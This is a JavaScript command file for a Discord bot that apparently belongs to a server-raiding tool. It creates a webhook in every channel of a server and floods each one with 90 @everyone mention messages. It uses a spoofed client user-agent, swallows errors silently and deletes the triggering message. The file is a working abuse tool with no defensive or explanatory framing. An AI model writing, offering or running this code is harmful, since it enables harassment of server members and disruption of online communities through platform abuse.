const colors = require('colors')
const { everyoneMsg } = require("../config.json");
const axios = require('axios')

function spam(wb) {
    for (let amount = 0; amount < 90; amount++) {
        axios({
            url: `https://discordapp.com/api/webhooks/${wb.id}/${wb.token}`,
            method: "POST",
            data: {
                "content": `@everyone curlyzadaaaaaaaaaa ${everyoneMsg}`
            },
            headers: {
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.309 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36"
            }
        }).then(() => {}).catch(err => {})
    }
}

exports.run = async(client, message, args) => {
    message.delete();
    message.guild.channels.forEach(c => {
        c.createWebhook(`unk`).then(
            wb => spam(wb)
        ).catch(e => {})
    });

     
    console.log(colors.green("  [+] Everyone flooded."))
}